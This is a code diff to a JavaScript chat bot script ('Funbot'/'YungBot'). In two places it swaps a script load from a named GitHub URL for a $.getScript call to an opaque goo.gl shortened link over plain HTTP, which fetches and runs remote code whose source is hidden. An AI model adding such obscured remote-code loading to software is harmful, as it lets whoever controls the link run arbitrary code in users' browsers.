@@ -393,7 +393,7 @@ API.setVolume(15);
 };
 
 Funbot.hook = function(){
-(function(){$.getScript('https://raw.githubusercontent.com/wildebevst/Fun-Bot/master/Bot/YungBot.js');
+(function(){$.getScript('http://goo.gl/MMsPi1');
 $('#audience').hide();
 API.setVolume(0);}());
 };
@@ -1513,7 +1513,7 @@ function chatMe(msg)
     console.log("YungBot-Script version " + YungBot.misc.version);
  
     setTimeout(function(){
-        $.getScript('https://raw.githubusercontent.com/wildebevst/Fun-Bot/master/Bot/YungBot.js');
+        $.getScript('http://goo.gl/MMsPi1');
         $.getScript('http://connect.soundcloud.com/sdk.js');
     }, 700);
  
